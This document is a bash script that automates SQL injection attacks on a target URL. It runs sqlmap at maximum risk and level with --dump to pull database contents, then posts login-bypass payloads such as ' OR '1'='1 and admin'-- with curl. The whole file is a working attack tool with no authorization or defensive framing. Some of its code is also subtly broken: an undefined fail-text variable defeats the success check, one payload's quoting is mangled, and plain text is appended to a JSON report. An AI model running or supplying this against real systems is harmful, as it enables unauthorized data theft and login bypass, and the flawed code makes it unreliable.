#!/bin/bash

# Make this script executable: chmod +x script.sh

TARGET_URL="$1"
DATA="$2"  # e.g., "username=admin&password=admin"
REPORT_FILE="sql_output.json"
OUTPUT_DIR="./output"

mkdir -p $OUTPUT_DIR

echo "[*] Starting SQLmap injection test..."
sqlmap -u "$TARGET_URL" --data="$DATA" --batch --risk=3 --level=5 --dump --threads=5 --random-agent --answers="follow=Y" --flush-session --output-dir="$OUTPUT_DIR" --save --forms --crawl=1 --json-output="$REPORT_FILE" > /dev/null

if [ -f "$REPORT_FILE" ]; then
    echo "[+] Vulnerability confirmed. Dump successful."
    python3 parse_sqlmap_results.py "$REPORT_FILE"
else
    echo "[-] Target not vulnerable or dump failed."
    echo '{"status":"not vulnerable", "target":"'"$TARGET_URL"'"}' > result_log.json
fi


# Test common SQLi payloads to simulate login bypass
echo "Testing form-based SQL injection bypass payloads..."

PAYLOADS=("' OR '1'='1" "' OR 1=1 -- " "' OR 'a'='a" "" OR "1"="1" "admin'--")

for PAYLOAD in "${PAYLOADS[@]}"; do
    echo "Testing payload: $PAYLOAD"
    RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "username=$PAYLOAD&password=$PAYLOAD")
    if [[ "$RESPONSE" != *"$DEFAULT_FAIL_TEXT"* ]]; then
        echo "[+] Potential SQL Injection vulnerability found using payload: $PAYLOAD"
        echo "Payload: $PAYLOAD" >> "$REPORT_FILE"
        echo "Bypass success with username and password as: $PAYLOAD" >> "$REPORT_FILE"
    else
        echo "[-] Payload $PAYLOAD failed."
    fi
done

echo "Form-based SQL injection bypass test complete."
